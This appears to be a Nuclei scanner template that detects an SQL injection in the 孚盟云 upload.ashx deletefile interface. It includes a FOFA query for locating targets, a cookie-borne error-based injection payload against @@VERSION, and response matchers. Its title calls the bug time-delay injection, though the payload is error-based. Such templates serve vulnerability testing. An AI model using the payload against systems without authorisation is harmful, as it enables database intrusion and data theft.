id: fumengyun-upload_ashx-deletefile-sql

info:
  tags: fumengyun-upload_ashx-deletefile-sql
  name: 孚盟云 upload.ashx deletefile SQL延时注入漏洞
  author: xc
  severity: high
  description: |-
    fofa: app="孚盟软件-孚盟云"
    孚盟云 upload.ashx deletefile接口处存在SQL注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
http:
  - raw:
      - |
        GET /Ajax/upload.ashx?action=deletefile&name=sqli HTTP/1.1
        Host: {{Hostname}}
        Cookie: sqli=1' AND 1=@@VERSION--
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'Microsoft SQL'
          - '转换成数据类型 int 时失败'
        condition: and
      - type: status
        status: 
          - 500
